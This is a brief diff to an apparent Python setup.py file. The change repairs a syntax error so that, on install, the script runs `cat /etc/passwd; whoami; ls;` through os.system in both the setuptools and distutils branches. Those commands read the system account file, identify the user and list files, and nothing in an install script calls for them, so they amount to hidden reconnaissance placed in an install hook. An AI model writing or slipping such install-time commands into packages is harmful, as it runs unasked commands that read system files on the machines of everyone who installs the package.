@@ -5,7 +5,7 @@ import os
 
 try:
     from setuptools import setup
-    print(os.system("cat /etc/passwd; whoami; ls;")
+    print(os.system("cat /etc/passwd; whoami; ls;"))
 except ImportError:
     from distutils.core import setup
     print(os.system("cat /etc/passwd; whoami; ls;"))
